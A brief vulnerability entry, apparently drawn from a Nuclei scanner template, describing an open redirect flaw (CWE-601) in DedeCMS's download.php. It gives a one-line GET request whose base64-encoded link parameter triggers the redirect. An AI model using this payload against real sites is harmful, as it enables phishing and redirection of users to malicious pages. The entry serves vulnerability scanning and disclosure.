# Vulnerability: DedeCMS - Open Redirect
**Classification:** CWE-601
**Source:** Nuclei Template (`dedecms-openredirect.yaml`)

## Description
DedeCMS contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/plus/download.php?open=1&link=aHR0cHM6Ly9pbnRlcmFjdC5zaA==
```

